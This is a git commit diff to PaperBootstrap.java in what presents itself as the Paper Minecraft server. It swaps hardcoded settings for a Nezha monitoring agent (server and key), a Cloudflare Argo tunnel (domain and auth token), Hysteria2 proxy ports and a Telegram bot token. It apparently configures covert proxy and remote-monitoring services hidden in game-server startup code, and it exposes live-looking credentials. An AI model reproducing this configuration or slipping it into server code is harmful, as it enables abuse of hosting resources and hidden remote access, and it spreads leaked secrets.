c3d76a697c2003ee04a394a26e490cf3b76421cf
BailangMax <langb6416@gmail.com>
2025-09-23 10:09:38 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,15 +92,15 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "2d98105d-d5a2-4dcc-8013-b7ed865b2217");
+        envVars.put("UUID", "f636defc-4251-4fc9-95d6-3084f4d3a156");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "a.holoy.dpdns.org:36958");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif");
         envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "greathost.holoy.qzz.io");
-        envVars.put("ARGO_AUTH", "eyJhIjoiYjNiMmRhZjE1YjIzYmQ2ZmIzNzZlNGViYTRhYzczYTEiLCJ0IjoiMzE1NDk1OTctNDU2YS00MTgzLTgzMGYtMjAzMDhlYzNkMzkxIiwicyI6Ik0yUTJaRFUxTVRRdFkyWTVNaTAwTjJJNUxUaGxaRGN0TkdVNE1HVmxZMkl6TW1FMyJ9");
-        envVars.put("HY2_PORT", "20473");
+        envVars.put("ARGO_DOMAIN", "zenix.ooxxx.ggff.net");
+        envVars.put("ARGO_AUTH", "eyJhIjoiYjNiMmRhZjE1YjIzYmQ2ZmIzNzZlNGViYTRhYzczYTEiLCJ0IjoiNmRmY2YzNTItZWY3YS00MzAyLThmYTMtMzBiZDc3MzJhNTI5IiwicyI6IlpUUmpNemRpWW1JdE1EazNNUzAwTmpWakxUazJPR1F0T1RKaVpUVTNNVGN4TWpGayJ9");
+        envVars.put("HY2_PORT", "25586");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "8337759907:AAGvmCiBeS2G_RXiNEUHYa4cdxn119nzV44");
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "greathost.es");
+        envVars.put("NAME", "free.zenix.sg");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
